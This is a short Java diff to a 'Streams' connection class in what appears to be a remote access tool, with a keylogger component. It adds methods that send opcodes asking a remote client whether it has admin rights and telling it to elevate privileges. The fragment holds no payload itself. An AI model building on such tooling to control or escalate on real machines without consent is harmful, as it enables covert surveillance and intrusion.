@@ -3,6 +3,7 @@ package Connections;
 
 import GUI.ProgressBar.DownloadProgressBar;
 import GUI.TableUtils.KeyLogger.KeyloggerEvents;
+import GUI.TableUtils.Permissions.Permissions;
 import Information.*;
 
 import org.json.JSONObject;
@@ -282,7 +283,7 @@ public class Streams {
         switch (event) {
             case STATE -> {
                 sendSize(15);
-                return Boolean.parseBoolean(readString());
+                return (readSize()!=0);
             }
             case CHECK_LAST -> {
                 sendSize(1403);
@@ -295,6 +296,33 @@ public class Streams {
         }
         return false;
     }
+
+    public boolean sendAndReadJSON(Permissions permissions) throws IOException {
+        switch (permissions) {
+            case IS_ADMIN -> {
+                sendSize(19);
+                return readSize()!=0;
+            }
+            case ELEVATE_PRIVILEGES -> {
+                sendSize(20);
+                return readSize()!=0;
+            }
+
+        }
+        return false;
+    }
+
+    public int sendAndReadJSONX(Permissions permissions) throws IOException {
+        switch (permissions) {
+            case ELEVATE_PRIVILEGES -> {
+                sendSize(20);
+                return readSize();
+            }
+
+        }
+        return 0;
+    }
+
 
     public void sendList(List<String> fileList) throws IOException {
         for (String file : fileList) {
